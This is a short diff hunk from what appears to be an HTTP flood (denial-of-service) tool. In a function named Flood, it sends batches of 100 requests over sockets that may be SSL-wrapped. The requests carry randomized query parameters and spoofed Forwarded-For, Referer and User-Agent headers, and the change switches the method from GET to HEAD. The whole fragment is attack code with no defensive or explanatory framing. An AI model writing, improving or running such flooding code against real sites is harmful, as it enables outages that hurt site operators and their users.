@@ -105,7 +105,7 @@ def Flood(indexPicker):
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
             for _ in range(100):
                 valueParams = f"?{rC(queryParams)}={rI(1, 65535)}&{rC(queryParams)}={rI(1, 65535)}"
-                floodHeader = f"GET {targetPath}{valueParams} HTTP/1.1\r\nHost: {targetHost}\r\n" + Connection + Accept + Referer + X_Forwarded_For + User_Agent
+                floodHeader = f"HEAD {targetPath}{valueParams} HTTP/1.1\r\nHost: {targetHost}\r\n" + Connection + Accept + Referer + X_Forwarded_For + User_Agent
                 s.send(str(floodHeader).encode())
                 s.send(str(floodHeader).encode())
             
